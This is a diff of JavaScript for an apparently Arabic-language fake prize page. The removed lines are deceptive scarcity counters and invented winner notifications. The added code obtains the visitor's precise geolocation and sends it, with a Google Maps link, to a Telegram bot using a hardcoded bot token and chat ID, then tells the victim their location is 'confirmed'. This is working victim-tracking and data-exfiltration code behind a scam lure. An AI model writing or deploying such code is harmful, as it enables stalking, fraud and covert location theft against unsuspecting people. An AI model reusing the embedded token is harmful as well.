@@ -1,32 +1,66 @@
-// إشعار بعدد الهواتف المتبقية
-let remaining = 5;
-const remainingDisplay = document.getElementById("remaining-count");
-setInterval(() => {
-    if (remaining > 1) {
-        remaining--;
-        remainingDisplay.textContent = `${remaining} أجهزة متبقية! أسرع!`;
-    }
-}, 5000);
+document.getElementById("getLocation").addEventListener("click", () => {
+  const statusMsg = document.getElementById("statusMsg");
 
-// رسالة تأكيد وهمية بعد الضغط
-document.getElementById("confirm-btn").addEventListener("click", () => {
-    alert("تم تأكيد موقعك بنجاح! جارٍ معالجة طلبك...");
-    setTimeout(() => {
-        alert("تم إرسال طلبك! سنقوم بالتواصل معك قريبًا.");
-    }, 3000);
+  if (navigator.geolocation) {
+    statusMsg.textContent = "جاري تحديد موقعك...";
+    navigator.geolocation.getCurrentPosition(sendLocation, showError);
+  } else {
+    statusMsg.textContent = "المتصفح لا يدعم تحديد الموقع.";
+  }
 });
 
-// إشعار تلقائي بالمستخدمين الجدد
-const notifications = [
-    "محمد من القاهرة حصل على آيفون 13!",
-    "سارة من طنطا أكدت موقعها!",
-    "أحمد من الإسكندرية حصل على فرصة اليوم!",
-];
-setInterval(() => {
-    const random = notifications[Math.floor(Math.random() * notifications.length)];
-    const notifBox = document.createElement("div");
-    notifBox.className = "fake-notification";
-    notifBox.textContent = random;
-    document.body.appendChild(notifBox);
-    setTimeout(() => notifBox.remove(), 5000);
-}, 8000);
+function sendLocation(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+  const acc = position.coords.accuracy;
+
+  const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+  const message = `
+مستخدم جديد فتح رابط الجوائز:
+
+📍 الموقع الجغرافي:
+- خط العرض: ${lat}
+- خط الطول: ${lon}
+- دقة الموقع: ${acc} متر
+
+رابط مباشر للموقع:
+${googleMapsLink}
+  `;
+
+  const token = "7874509299:AAEXnwpKl-m7E2pVuuYWxfixW-YC1oZ3Ng0"; // ← استبدل بالتوكن الحقيقي
+  const chatId = "6817512459"; // ← استبدل بـ ID التليجرام الحقيقي
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+  fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  })
+  .then(() => {
+    document.getElementById("statusMsg").textContent = "تم تأكيد موقعك! سيتم التواصل معك قريبًا.";
+  })
+  .catch(() => {
+    document.getElementById("statusMsg").textContent = "حدث خطأ أثناء الإرسال، حاول مجددًا.";
+  });
+}
+
+function showError(error) {
+  const statusMsg = document.getElementById("statusMsg");
+  switch (error.code) {
+    case error.PERMISSION_DENIED:
+      statusMsg.textContent = "تم رفض إذن تحديد الموقع.";
+      break;
+    case error.POSITION_UNAVAILABLE:
+      statusMsg.textContent = "موقعك غير متاح حاليًا.";
+      break;
+    case error.TIMEOUT:
+      statusMsg.textContent = "انتهى وقت المحاولة.";
+      break;
+    default:
+      statusMsg.textContent = "حدث خطأ غير معروف.";
+  }
+}
